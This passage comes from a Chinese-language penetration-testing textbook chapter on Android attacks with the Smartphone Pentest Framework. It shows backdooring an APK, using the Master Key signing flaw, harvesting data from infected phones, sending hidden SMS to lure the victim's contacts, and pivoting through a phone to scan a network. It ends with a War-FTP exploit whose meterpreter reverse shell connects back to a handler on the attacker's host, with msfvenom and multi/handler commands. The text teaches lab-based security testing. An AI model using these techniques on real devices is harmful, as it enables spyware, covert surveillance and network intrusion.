  \ `SPF` 向 Android 模拟器发送 `SMS`。\n\n在 Android 2.2 模拟器上，点击 `SMS` 中的链接。应用应该下载。下载完成后，点击**安装**，接受权限并打开应用。如[图\
  \ 20-3 所示，代理看起来用起来就像原始应用（Google Maps 演示），但后台有一些额外功能。\n\n![后门应用](http://atomoreillycomsourcenostarch2030592.png.jpg)图\
  \ 20-3 后门应用\n\n现在将 `SPF` 附加到已部署的代理。如果你向大量号码发送 `SMS` 活动，谁知道有多少用户会安装代理或速度有多快，但代理具有签入功能（参见示例\
  \ 20-13），将响应 `SPF` 查询其已部署的查询。\n\n示例 20-13. 将 SPF 附加到已部署的代理\n\n```\nspf> 1\n\nSelect\
  \ An Option from the Menu:\n    1.) Attach Framework to a Deployed Agent\n    2.)\
  \ Generate Agent App\n    3.) Copy Agent to Web Server\n    4.) Import an Agent\
  \ Template\n    5.) Backdoor Android APK with Agent\n    6.) Create APK Signing\
  \ Key\n\nspf> ❶❶\nAttach to a Deployed Agent:\n\n这将设置用于控制已部署代理的处理器。\n\nAgent URL\
  \ Path: /androidagent1❷\nAgent Control Key: KEYKEY1❸\nCommunication Method(SMS/HTTP):\
  \ HTTP❹\n\nURL Path: /androidagent1\nControl Key: KEYKEY1\nCommunication Method(SMS/HTTP):\
  \ HTTP\nIs this correct?(y/N): y\n```\n\n在主菜单中选择选项 `1`，然后选择 `1.) Attach Framework`\
  \ `to a` `Deployed Agent` ❶。系统会提示路径 ❷、密钥 ❸ 和通信媒介 ❹。输入你创建代理时使用的相同值。\n\n\n\n\n\nSPF\
  \ 在等待代理响应时会像挂起了一分钟。返回菜单后，你应该已经连接到了该代理。现在从主菜单中选择 `2.) Send Commands to an Agent`（向代理发送命令）。你将看到数据库中的代理列表；你应该能在列表中看到刚刚附加到\
  \ SPF 的代理，如下所示。\n\n```\nspf> 2\nAvailable Agents:\n15555215556\n```\n\n## 为 APK\
  \ 留后门\n\n在我们继续使用已部署的 SPF 代理之前，让我们来看另一种可能更复杂的创建代理的方法。因为你可能并不总是拥有想要留后门的应用程序源码，SPF\
  \ 可以与预编译的 APK 文件配合工作。任何 APK 包括 Google Play 商店中的应用。\n\n要使用 SPF 代理为 APK 留后门，请从主菜单选择\
  \ `1`，然后选择 `5.) Backdoor Android APK with Agent`（使用代理后门 Android APK），如示例 20-14 所示。\n\
  \n### 示例 20-14. 为 APK 留后门\n\n```\nspf> 1\n\nSelect An Option from the Menu:\n  \
  \  1.) Attach Framework to a Deployed Agent\n    2.) Generate Agent App\n    3.)\
  \ Copy Agent to Web Server\n    4.) Import an Agent Template\n    5.) Backdoor Android\
  \ APK with Agent\n    6.) Create APK Signing Key\nspf> 5\nAPKTool not found! Is\
  \ it installed? Check your config file\nInstall Android APKTool(y/N)?\nspf> y\n\n\
  --2015-12-04 12:28:21--  https://android-apktool.googlecode.com/files/apktool-install-linux-r05-ibot.tar.bz2\n\
  --snip--\nPuts the Android Agent inside an Android App APK. The application runs\
  \ normally with extra functionality\nAPK to Backdoor: `/root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk\n\
  I: Baksmaling...\n--snip--\n```\n\nSPF 默认不会安装反编译 APK 所需的 `APKTool` 程序；它会询问你是否要安装。输入\
  \ `y`，SPF 将安装 APKTool 并继续。\n\n在提示时，告诉 SPF 为 APK `/root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk`\
  \ 留后门（这是之前使用的 Google Maps Demo 代码的编译版本）。SPF 将反编译该 APK，将其与 SPF 代理结合并重新编译。\n\n为了设置代理，SPF\
  \ 需要知道控制手机号码、控制密钥和控制路径。这与我们在为源码留后门时使用的信息相同，如示例 20-15 所示。\n\n### 示例 20-15. 设置选项\n\
  \n```\nPhone number of the control modem for the agent: 15555215554\nControl key\
  \ for the agent: KEYKEY1\nWebserver control path for agent: /androidagent1\nControl\
  \ Number: 15555215554\nControl Key: KEYKEY1\nControlPath:/androidagent1\nIs this\
  \ correct?(y/n) y\n--snip--\n```\n\n在 APKTool 重新编译后门 APK 后，我们需要对其进行签名。在安装时，Android\
  \ 设备会检查 APK 上的签名。如果没有签名，即使是模拟器也会拒绝安装。Google Play 应用是使用在 Google 注册的开发者密钥进行签名的。\n\n\
  要在未限制为 Google 应用的模拟器和设备上运行应用，我们只需使用一个未在 Google 注册的调试密钥，但应用仍然必须经过签名。在为源码留后门时，我们可以跳过这一步，因为我们使用\
  \ Android SDK 编译了代码，它会自动使用默认密钥库对我们的代码进行签名。由于我们在这里使用了 APKTool，我们需要手动重新创建签名。\n\n系统将询问你是否想使用\
  \ Android 主密钥（Master Key）漏洞，该漏洞允许攻击者和渗透人员欺骗签名验证过程，使其认为我们的应用是已安装应用程序的合法更新。换句话说，我们将允许用自己的代码替换合法应用程序，Android\
  \ 系统将其视为来自供应商的合法更新。（此验证过程中的缺陷在 Android 4.2 中已修复）。要使用 Android 主密钥漏洞，请在提示处输入 `y`，如下所示。\n\
  \n### 注意\n为了利用此问题，原始应用程序及其签名会被复制到我们的后门 APK 中。关于如何触发主密钥漏洞的细节可以在此处找到：http://www.saurik.com/id/17。\n\
  \n```\nUse Android Key Vuln?(y/N): y\nArchive: /root/Desktop/abcnews.apk\n--snip--\n\
  Inflating: unzipped/META-INF/CERT.RSA\n```\n\n要看到 Android 主密钥漏洞的作用，请在运行 Android\
  \ 版本低于 4.2 的设备上从 `/root/Smartphone-Pentest-Framework/APKs/` 安装合法的 `MapsDemo.apk`\
  \ 版本，然后尝试通过 SPF 使用短信或 NFC 你刚刚创建的后门版本。你应该会收到提示替换 `MapsDemo.apk`，尽管我们没有访问构建后门版本正确签名所需的私钥，但签名验证应该会成功。\n\
  \n如果你的目标对主密钥漏洞敏感，或者应用不在目标设备上，你可以直接使用 Kali 上的默认 Android 密钥库对应用进行签名。为此，在 Use Android\
  \ Key Vuln 提示处输入 `n`，如示例 20-16 所示。\n\n### 示例 20-16. 为 APK 签名\n\n```\nUse Android\
  \ Key Vuln?(y/N): n\nPassword for Debug Keystore is android\nEnter Passphrase for\
  \ keystore:\n--snip--\nsigning: resources.arsc\n```\n\n你会被提示输入调试密钥库的密码。默认情况下，此操作不会使用发布到\
  \ Google Play 的密钥签名 APK，但它可以满足我们的目的。该应用现在已使用调试密钥签名，并可以在任何不限制官方 Play Store 应用的设备上安装。请注意，没有任何东西阻止渗透人员使用他们注册的合法\
  \ Google Play 密钥对应用签名，如果渗透范围包括尝试欺骗用户从 Google Play 商店下载恶意应用。\n\n### 注意\n后门 APK 功能等同于我们在后门源码中创建的代理，并以相同的方式部署。当然，在我们查看部署代理后对设备及其本地网络可以做什么时，我们已经有一个可以使用的部署代理了。\n\
  \n## 移动后渗透\n\n现在我们进入了设备，我们可以从设备中收集本地信息（例如联系人或收到的短信），并远程控制设备以执行诸如拍照等操作。如果我们对现有权限不满意，可以尝试对设备进行权限提升并获取\
  \ root 权限。我们甚至可以使用被攻击的移动设备攻击网络上的其他设备。（如果设备直接连接到公司网络或使用 VPN 访问网络，这种攻击可能特别有趣。）\n\n\
  ### 信息收集\n\n我们将通过获取受感染设备上安装的应用列表来运行信息收集示例，如示例 20-17 所示。\n\n### 示例 20-17. 在代理上运行命令\n\
  \n```\nspf> 2\nView Data Gathered from a Deployed Agent:\nAvailable Agents:\n  \
  \  1.) 15555215556\nSelect an agent to interact with or 0 to return to the previous\
  \ menu.\nspf> 1\nCommands:\n    1.) Send SMS\n    2.) Take Picture\n    3.) Get\
  \ Contacts\n    4.) Get SMS Database\n    5.) Privilege Escalation\n    6.) Download\
  \ File\n    7.) Execute Command\n    8.) Upload File\n    9.) Ping Sweep\n    10.)\
  \ TCP Listener\n    11.) Connect to Listener\n    12.) Run Nmap\n    13.) Execute\
  \ Command and Upload Results\n    14.) Get Installed Apps List\n    15.) Remove\
  \ Locks (Android < 4.4)\n    16.) Upload APK\n    17.) Get Wifi IP Address\nSelect\
  \ a command to perform or 0 to return to the previous menu\nspf> 14\n    Gets a\
  \ list of installed packages(apps) and uploads to a file.\n    Delivery Method(SMS\
  \ or HTTP): HTTP\n```\n\n\n\n\n\n从主菜单中选择选项 `2`，然后从列表 ❶ 选择代理（agent）。当出现可用代理功能列表 ❷\
  \ 时，选择 `14.) Get Installed Apps List` ❸。SPF 会询问你希望通过何种方式传递命令；我们将使用 `HTTP` ❹。（记住，代理可以通过\
  \ `HTTP` 和 SMS 进行通信并接收命令。）\n\n输入 `0` 返回上一个菜单，直到回到主菜单。等待几，然后选择 `3.) View Information\
  \ Gathered`，如示例 20-18 所示。\n\n示例 20-18. 查看收集到的数据\n\n```\nspf> 3\nView Data Gathered\
  \ from a Deployed Agent:\nAgents or Attacks? Agents❶\nAvailable Agents:\n    1.)\
  \ 15555215556\nSelect an agent to interact with or 0 to return to the previous menu.\n\
  spf> 1❷\nData:\nSMS Database:\nContacts:\nPicture Location:\nRooted:\nPing Sweep:\n\
  File:\nPackages: package:com.google.android.location❸\n--snip--\npackage:com.android.providers.downloads\n\
  package:com.android.server.vpn\n```\n\n你会被问及想查看攻击（Attacks）还是代理（Agents）的结果；输入 `Agents`\
  \ ❶。选择我们的代理 ❷。设备信息将从数据库中提取，尽管目前我们拥有的通过上一个命令 ❸ 收集的已安装列表列表你可以运行额外的信息收集命令来填充更多条目。）\n\
  \n### 远程控制\n\n现在让我们看看如何使用代理远程控制设备。我们可以让设备发送一条短信，该短信不会显示在短信 应用的发送记录中。事实上，用户完全不会察觉到发送过消息——还有什么更好的方法来利用“信任圈”呢？也许我们可以获取用户所有的联系人，并向他们发送消息，告诉他们应该安装我们酷炫的\
  \ App，而这个 App 恰好指向 SPF 代理。因为消息来自他们认识的人，用户更有可能安装该代理。\n\n我们现在先发送一个示例消息，如示例 20-19 所示。\n\
  \n示例 20-19. 远程控制代理\n\n```\nCommands:\n--snip--\nSelect a command to perform or 0\
  \ to return to the previous menu\nspf> 1❶\nSend an SMS message to another phone.\
  \ Fill in the number, the message to send, and the delivery method(SMS or HTTP).\
  \ evenNumber: 15555215558\nMessage: hiya Georgia\nDelivery Method Method SMS\n```\n\
  \n在代理命令菜单中，选择选项 `1.) Send SMS` ❶。当提示手机号码、消息内容以及你希望如何传递命令时，告诉你的代理向 Android 2.1 模拟器发送消息。\n\
  \n你的 Android 2.1 模拟器将收到一封来自 Android 2.2 模拟器的包含输入内容的短信，且两个模拟器上都没有迹象显示这不是一条普通消息。\n\
  \n### 通过移动设备进行中继\n\n移动设备管理（MDM）和移动版杀病毒软件还有很长的路要走。与其他许多安全控制相比，强制员工使用这些解决方案的公司数量仍然很小，有些公司甚至完全不允许使用移动设备。但让我们面对现实：员工可能知道公司的无线密码。连接你的移动设备，它就神奇地成为了与你的工作站和其他可能包含敏感信息的设备处于同一个网络中的成员。\n\
  \n自然地，公司更擅长加固其面向外部的资产。毕竟，这些设备面临着来自互联网上任何人的攻击，而且它们占据了大部分的注意力。但在内部，情况开始变得糟糕。弱口密码、缺失的补丁和过时的客户端软件都是我们在书中检查过的问题，它们可能潜伏在内部网络中。如果一个被利用的移动设备具有直接访问这些脆弱系统的权限，我们可能将其作为中继（pivot）来发起额外的攻击，完全绕过防御边界。\n\
  \n我们在第 13 章 中研究过中继，当时我们使用被利用的机器从一个网络移动到另一个网络。我们在这里可以使用 SPF 代理执行同样的事情，有效地通过被利用的移动设备对移动网络进行渗透测试，如图\
  \ 20-4 所示。\n\n![通过受感染的移动设备进行中继以攻击内部设备](img/httpatomoreillycomsourcenostarchimages2030594.png.jpg)图\
  \ 20-4. 通过受感染的移动设备进行中继以攻击内部设备\n\n#### 使用 Nmap 进行端口扫描\n\n我们首先通过代理命令选项对本地网络进行 ping\
  \ 扫描，以查看上有哪些设备。接下来，我们将进行端口扫描，如第 5 章所述。事实证明你可以在被利用的设备上安装 `Nmap` Android 二进制文件。从主菜单选择\
  \ `10.) Install Stuff`，并告诉 SPF 安装 Android 版 `Nmap`，如示例 20-20 所示。\n\n示例 20-20. 安装\
  \ Nmap\n\n```\nspf> 10\n\nWhat would you like to Install?\n    1.) Android SDK\n\
  \    2.) Android APK\n    3.) Download Nmap\nspf> 3\n\nDownload Nmap for Android(y/N)?\n\
  spf> y\n```\n\n现在使用选项 `12.) Run Nmap` 从 Android 运行 `Nmap`。让我们针对我们的目标 ❶ 运行 `Nmap`，如示例\
  \ 20-21 所示。确保我们在第 17 章和第 18 章中利用的 FTP 程序仍在运行。（我们将在下一节通过中继利用它。）\n\n示例 20-21. 从 Android\
  \ 运行 Nmap\n\n```\nSelect a command to perform or 0 to return to the previous menu\n\
  spf> 12\n\n    Download Nmap and port scan a host of range. Use any accepted format\
  \ for target specification\nNmap Target: 192.168.20.10\nDelivery Method(SMS or HTTP)\
  \ HTTP\n```\n\n让 `Nmap` 运行几分钟，然后检查代理收集的信息。你会注意到 `File` 字段指向 `*/root/Smartphone-Pentest-Framework/frameworkconsole/text.txt*`。查看此文件的内容——你应该看到类似于示例\
  \ 20-22](#ch20.html_nmap_results \"示例 20-22. Nmap results\")的内容。\n\n示例 20-22. Nmap\
  \ results\n\n```\n# Nmap 5.61TEST4 scan initiated Sun Sep  6 23:41:30 2015 as: /data/data/com.example.android.google\n\
  .apis/files/nmap -oA /data/data/com.example.android.google.apis/files/nmapoutput\
  \ 192.168.20.10\nNmap scan report for 192.168.20.10\nHost is up (0.0068s latency).\n\
  Not shown: 992 closed ports\nPORT     STATE SERVICE\n21/tcp   open  ftp\n--snip--\n\
  \n# Nmap done at Sun Sep  6 23:41:33 2015 -- 1 IP address (1 host up) scanned in\
  \ 3.43 seconds\n```\n\n与其使用被利用的移动设备作为中继进行整个渗透测试，让我们最后通过 SPF 代理运行一个漏洞利用来结束。\n\n####\
  \ 利用本地网络中的系统\n\n\n\n\n\n遗憾的是，Android 设备默认并不识别 `Python` 和 `Perl` 等脚本语言；为了运行利用程序，我们需要一些\
  \ C 代码。我们在第 17 章中为 `War-FTP` 1.65 编写了一个简单的 C 版本利用程序，位于 `/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c`。其中包含的\
  \ shellcode 会运行一个 `windows/meterpreter/reverse_tcp` 载荷，并将其发送回 `192.168.20.9` 的 `4444`\
  \ 端口。如果你的 Kali 系统位于另一个 IP 地址，请如文所示使用 `Msfvenom` 重新生成 shellcode。（不要忘记第 17 章中提到的 `War-FTP`\
  \ 坏字符 bad characters。我们可以使用 `Msfvenom` 的 `-b` 标志来规避这些字符。）\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.168.20.9 -f c -b '\\x00\\x0a\\x0d\\x40'\n```\n\n一旦你替换了利用程序中的 shellcode，如果有必要，我们需要编译\
  \ C 代码以便其在 Android 设备上运行。如果我们像在第 3 章中那样使用 `GCC`，利用程序可以在我们的 Kali 上正常运行，但 Android\
  \ 手机上的 ARM 处理器将无法识别它。\n\n我们在第 12 章中简要介绍过 Windows 的交叉编译器，它允许我们在 Kali 上编译 C 代码并在 Windows\
  \ 上运行。只要我们有 ARM 交叉编译器，我们也可以对 Android 执行同样的事情。幸运的是，SPF 拥有一个。如示例 20-23 所示，从主菜单中选择选项\
  \ `9.) Compile code to run on mobile devices`。\n\n#### 示例 20-23. 编译 C 代码并在 Android\
  \ 上运行\n\n```\nspf> 9\n\nCompile code to run on mobile devices\n    1.) Compile C\
  \ code for ARM Android\nspf> 1❶\n\nCompiles C code to run on ARM based Android devices.\
  \ Supply the C code file and the output filename\nFile to Compile: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c❷\n\
  Output File: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter\n\
  ```\n\n选择 `1.) Compile C code for ARM Android` ❶。系统会提示你要编译的 C 文件以及你想放置编译后的二进制文件的位置\
  \ ❷。\n\n现在，我们需要将 `War-FTP` 利用程序下载到我们受感染的 Android 设备上。从代理命令菜单中，选择选项 `6` 下载文件。系统会要求提供要下载的文件和传输方式，如示例\
  \ 20-24 所示所示。\n\n#### 示例 20-24. 下载利用程序\n\n```\nSelect a command to perform or 0\
  \ to return to the previous menu\nspf> 6\n\n    Downloads a file to the phone. Fill\
  \ in the file and the delivery method(SMS or HTTP).\nFile to download: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter\n\
  Delivery Method(SMS or HTTP): HTTP\n```\n\n在运行利用程序之前，我们需要在 `Msfconsole` 中设置一个处理器（handler），如示例\
  \ 20-25 所示。在 Kali 上打开 `Msfconsole` 并使用 `multi/handler` 模块，设置选项与 `War-FTP` 利用程序中的载荷匹配。\n\
  \n#### 示例 20-25. 设置 multi/handler\n\n```\nmsf > use multi/handler\nmsf exploit(handler)\
  \ > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\n\
  msf exploit(handler) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(handler)\
  \ > exploit\n\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Starting the\
  \ payload handler...\n```\n\n最后，是时候运行利用程序了。如示例 20-26 所示，从代理命令菜单中选择选项 `7.) Execute\
  \ Command`；系统会提示你要运行的命令。\n\n#### 示例 20-26. 运行利用程序\n\n```\nSelect a command to perform\
  \ or 0 to return to the previous menu\nspf> 7\n\n    Run a command in the terminal.\
  \ Fill in the command and the delivery method(SMS or HTTP).\n\nCommand: warftpmeterpreter\
  \ 192.168.20.10 21❶\nDownloaded?: yes❷\nDelivery Method(SMS or HTTP): HTTP\n```\n\
  \n告诉我们完整的命令 ❶。系统会询问是否已下载 ❷。输入 `yes`，然后看到如下所示的提示符。\n\n```\nmeterpreter >\n```\n\n\
  \n\n\n从这里开始，我们对设备有了完全控制权。我们可以从 root shell 发布命令，或者将代理程序重新安装为系统应用，从而获得比原始应用更高的权限。\n\
  \n### 注意：这种特定的漏洞利用是一种资源耗尽攻击，因此如果你想继续使用该模拟器进行额外的练习，可能需要重启它，因为它在受到此类攻击后运行速度可能会变慢。\n\
  \n## 总结\n\n在本章中，我们简要回顾了移动漏洞领域这一较新且发展迅速的世界。我们使用我的 `SPF` 工具运行了多种攻击，主要针对模拟的 Android\
  \ 移动设备。当然，这些攻击在真实设备上的实现方式同样有效。我们研究了一种检查越狱版 iPhone 是否使用默认 `SSH` 密码的远程攻击，然后研究了两个客户端攻击示例。其中一个通过浏览器中的\
  \ `WebKit` 漏洞获取了 shell，另一个则通过从网页上自动拨出的 `USSD` 代码远程控制设备。\n\n我们接着转向了恶意应用程序，使用 `SPF`\
  \ Android 代理程序对合法的源代码或编译后的 `APK` 文件植后门。我们可以利用 `NFC` 和 `SMS` 等移动攻击向量诱骗用户安装我们的恶意应用。一旦代理程序安装，我们就运行了信息收集和远程控制等攻击，并使用\
  \ `SPF` 利用 Android 平台已知漏洞将权限提升到 root。最后，我们使用 `SPF` 代理作为跳板攻击网络中的其他设备。我们从 Android\
  \ 设备上运行 `Nmap` 针对我们的 `Windows XP` 目标，然后使用针对 `War-FTP` 的 `C` 漏洞通过 `SPF` 代理利用 `Windows\
  \ XP` 目标。\n\n移动设备安全是一个令人的领域，随着设备进入工作场所，它为渗透测试增加了新的维度。作为渗透测试人员，了解一些移动漏洞将非常有帮助。由于攻击者利用这些设备获取敏感数据并在网络中建立脚点，测试人员必须能够模拟同样的威胁。\n\
  \n## 附录 A 资源\n\n以下资源在我信息安全的之旅中提供过帮助，并在我深入学习时持续作为参考。许多资源都会定期更新其领域的最新工具和技术。我鼓励你在阅读此书时参考这些资源，因此它们按章节列在这里。列表末尾是一些优秀的课程，你可以利用它们进一步深化渗透测试的研究。\n\
